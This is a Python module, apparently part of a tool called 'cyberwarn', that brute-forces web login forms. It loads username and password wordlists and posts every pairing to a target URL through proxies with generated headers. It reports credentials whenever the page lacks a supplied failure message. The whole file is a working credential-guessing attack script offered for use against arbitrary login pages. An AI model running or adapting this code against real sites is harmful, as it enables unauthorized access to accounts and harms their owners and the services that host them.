import os
import sys
import requests
from cyberwarn.core.core import log_server_response
from cyberwarn.core.colors import RED, RESET, BLUE, BOLD, GREEN
from cyberwarn.core.header import Headers
from cyberwarn.core.core import get_proxy

def get_wordlist(file_name:str) -> list[str]:
    if not os.path.exists(file_name):
        sys.exit(f"| {RED}File {file_name} not found!{RESET}")
    
    wordlist = set()
    with open(file_name, "r") as file:
        for line in file.readlines():
            wordlist.add(line.strip())
    print(f"| {GREEN}{file_name}: {BOLD}{len(wordlist)}{RESET}")
    return wordlist

def send_form(user:str, password:str, fail_message:str, url:str, data_form:str):
    if "&&" in fail_message:
        fail_message = fail_message.split("&&")
    else:
        fail_message = [fail_message]
    required_fields = ["USER", "PASSWORD"]
    for field in required_fields:
        if field not in data_form:
            sys.exit(
                    f"| {RED}missing required field: {BOLD}[{field}]{RESET}\n"
                    f"| {data_form}"
                    )
    fields = data_form.split("&")
    data = {}
    for field in fields:
        key, value = field.split("=")
        value = value.replace("[USER]", user).replace("[PASSWORD]", password)
        data[key] = value

    try:
        headers = Headers().create_headers()
        proxy = get_proxy()
        response_range_status = range(200, 400)
        response = requests.post(url, headers=headers, data=data, proxies=proxy)
        status_code = response.status_code
        print(f"| Response: {status_code}")
        if status_code not in response_range_status:
            log_server_response(
                    url=url, 
                    status=status_code, 
                    headers=response.headers
                    )
        if status_code in response_range_status:
            html = response.text
            
            fail = False
            for message in fail_message:
                if message in html:
                    print(f"| detected message: {message}")
                    fail = True
            if not fail:
                sys.exit(f"| Check access: {user} : {password}")


    except Exception as err:
        print(f"| {RED}error send form: {BOLD}{err}{RESET}")

def bruteforce_login(args:dict[str]):
    url_login = args["--url"]
    users_file = args["--users"]
    passwords_file = args["--passwords"]
    fail_message = args["--fm"]
    data_form = args["--form"]

    users_list = get_wordlist(file_name=users_file)
    passwords_list = get_wordlist(file_name=passwords_file)

    count_users = 0
    for user in users_list:
        count_users+=1
        count_password = 0
        for password in passwords_list:
            count_password+=1
            print(
                    f"| [{GREEN}{count_users}{RESET}/"
                    f"{RED}{len(users_list)}{RESET}]"
                    f"[{GREEN}{count_password}{RESET}/"
                    f"{RED}{len(passwords_list)}{RESET}] "
                    f"{user} : {password}"
                    )
            send_form(
                    user=user,
                    password=password,
                    fail_message=fail_message,
                    url=url_login,
                    data_form=data_form
                    )
